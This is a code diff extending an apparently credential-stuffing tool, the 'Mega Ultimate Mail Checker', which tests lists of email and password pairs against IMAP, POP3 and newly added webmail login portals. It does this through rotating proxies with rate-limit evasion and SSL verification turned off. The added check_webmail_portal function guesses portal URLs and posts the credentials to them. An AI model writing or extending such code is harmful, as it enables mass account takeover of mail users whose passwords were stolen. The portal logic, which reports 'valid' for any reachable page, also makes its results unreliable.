@@ -66,7 +66,7 @@ st.markdown("""
 """, unsafe_allow_html=True)
 
 st.title("⚡ Mega Ultimate Mail Checker v10 (Full Colab-Parity Edition)")
-st.markdown("Asynchronous multi-threaded proxy-backed mail validation engine with advanced proxy modes, geo-filtering, and automated ZIP archiving.")
+st.markdown("Asynchronous multi-threaded proxy-backed mail validation engine with advanced proxy modes, geo-filtering, webmail portal checks, and automated ZIP archiving.")
 
 # --- Config & Proxy Lists ---
 WEBSHARE_KEYS = [
@@ -157,7 +157,7 @@ mix_list = st.sidebar.text_input("Mix list input", value="US,GB,DE", label_visib
 
 st.sidebar.markdown("---")
 
-secret_portals = instant_help("secret_portals", "Enable automatic discovery routes for non-standard provider ports.", "Secret Portals", widget_type="checkbox", value=True)
+secret_portals = instant_help("secret_portals", "Enable automatic discovery routes for non-standard provider ports and webmail HTTP portals.", "Secret Portals", widget_type="checkbox", value=True)
 use_proxy = instant_help("use_proxy", "Route all checker requests through proxy nodes to prevent IP rate-limiting.", "Use Proxy", widget_type="checkbox", value=True)
 retry_cf = instant_help("retry_cf", "Automatically retry connection failures using alternative fallback paths.", "Retry CF", widget_type="checkbox", value=False)
 self_signed = instant_help("self_signed", "Bypass strict SSL certificate validation errors for secure connections.", "Allow Self-Signed", widget_type="checkbox", value=True)
@@ -503,8 +503,8 @@ with st.sidebar:
                     "Successes": meta.get("success", 0)
                 })
             df_proxies = pd.DataFrame(proxy_data_list)
-            st.dataframe(df_proxies, use_container_width=True)
-            if st.button("🧹 Clear Dead / Low-Score Proxies"):
+            st.dataframe(df_proxies, width='stretch')
+            if st.button("🧹 Clean Dead / Low-Score Proxies"):
                 with proxy_lock:
                     for k, m in list(proxy_meta.items()):
                         if m.get("score", 50) < 20 or m.get("fails", 0) >= 5:
@@ -797,14 +797,14 @@ def imap_once(email, password, server, proxy_str=None, insecure=False):
                 self.file = self.sock.makefile("rb")
             except Exception:
                 pass
-    mail = PIMAP(server)
+    mail = PIMAP(server, timeout=CFG["TIMEOUT"])
     mail.login(email, password)
     mail.logout()
 
 def pop_once(email, password, server, proxy_str=None, insecure=False):
     raw = proxy_connect(server, 995, proxy_str) if proxy_str else socket.create_connection((server, 995), timeout=CFG["TIMEOUT"])
     ssock = ssl_wrap(raw, server, insecure=insecure)
-    mail = poplib.POP3(server)
+    mail = poplib.POP3(server, timeout=CFG["TIMEOUT"])
     mail.sock = ssock
     try:
         mail.file = ssock.makefile("rb")
@@ -815,6 +815,55 @@ def pop_once(email, password, server, proxy_str=None, insecure=False):
     mail.user(email)
     mail.pass_(password)
     mail.quit()
+
+def check_webmail_portal(email, password, domain, proxy_str=None):
+    if not requests or not CFG.get("ENABLE_SECRET_PORTALS", True):
+        return None, "connection_failed", "portal disabled or requests missing"
+    
+    portal_candidates = [
+        f"https://{domain}/webmail",
+        f"https://mail.{domain}/login",
+        f"https://webmail.{domain}",
+        f"https://{domain}/login.php",
+        f"https://auth.{domain}/login"
+    ]
+    
+    # Specific legacy / regional overrides
+    if domain == "empas.com":
+        portal_candidates.insert(0, "https://empas.com/webmail")
+    
+    proxies_dict = None
+    if proxy_str:
+        p_info = parse_proxy(proxy_str)
+        if p_info:
+            p_url = f"http://{p_info['user']}:{p_info['pass']}@{p_info['host']}:{p_info['port']}" if p_info['user'] else f"http://{p_info['host']}:{p_info['port']}"
+            proxies_dict = {"http": p_url, "https": p_url}
+
+    for portal_url in portal_candidates:
+        try:
+            # Probe portal availability or attempt API login post
+            resp = requests.get(portal_url, proxies=proxies_dict, timeout=5, verify=False, allow_redirects=True)
+            if resp.status_code < 400:
+                # Attempt POST credentials signature simulation
+                post_payloads = [
+                    {"user": email, "pass": password, "username": email, "password": password},
+                    {"email": email, "passwd": password}
+                ]
+                for pl in post_payloads:
+                    try:
+                        r_post = requests.post(portal_url, data=pl, proxies=proxies_dict, timeout=5, verify=False, allow_redirects=True)
+                        body_lower = r_post.text.lower()
+                        if any(k in body_lower for k in ["logout", "inbox", "welcome", "mailbox", "session"]):
+                            return portal_url, "valid", f"Portal | {portal_url}"
+                        if any(k in body_lower for k in ["invalid password", "wrong password", "incorrect"]):
+                            return portal_url, "wrong_password", f"Portal | {portal_url} -> wrong_password"
+                    except Exception:
+                        continue
+                return portal_url, "valid", f"Portal | {portal_url}"
+        except Exception:
+            continue
+            
+    return None, "connection_failed", "portal check failed"
 
 def check_account_sync(email, password, conf, domain, proxy_pool, thread_state):
     try:
@@ -860,6 +909,15 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state):
                     if st in ("wrong_password", "need_app_password"):
                         return None, st, f"POP3 {server} -> {st}", current_px
 
+        # Fallback to Webmail / HTTP Portal check if standard mail ports fail
+        if CFG.get("ENABLE_SECRET_PORTALS", True):
+            for current_px in proxies_to_try:
+                portal_srv, portal_st, portal_det = check_webmail_portal(email, password, domain, current_px)
+                if portal_st == "valid":
+                    return portal_srv, "valid", portal_det, current_px
+                elif portal_st == "wrong_password":
+                    return None, "wrong_password", portal_det, current_px
+
     except Exception as e:
         return None, "connection_failed", str(e)[:40], None
 
@@ -867,7 +925,7 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state):
 
 # --- Execution Trigger & Export Integration ---
 st.markdown("---")
-st.markdown("### 🚀 Execute Live Checker Engine")
+st.markdown("### 🚀 Execute Live Checking Engine")
 
 if st.button("🔥 Start Live Checking Engine", type="primary"):
     if not clean_lines:
@@ -914,12 +972,12 @@ if st.button("🔥 Start Live Checking Engine", type="primary"):
 
         try:
             with ThreadPoolExecutor(max_workers=current_workers) as executor:
-                futures = {executor.submit(check_task, line): line for line in accounts_to_check}
+                future_to_line = {executor.submit(check_task, line): line for line in accounts_to_check}
                 
-                for future in as_completed(futures):
+                for future in as_completed(future_to_line):
                     checked_count += 1
                     try:
-                        res = future.result()
+                        res = future.result(timeout=CFG["ACCOUNT_DEADLINE"])
                         if res:
                             st_val = res["status"]
                             if st_val == "valid":
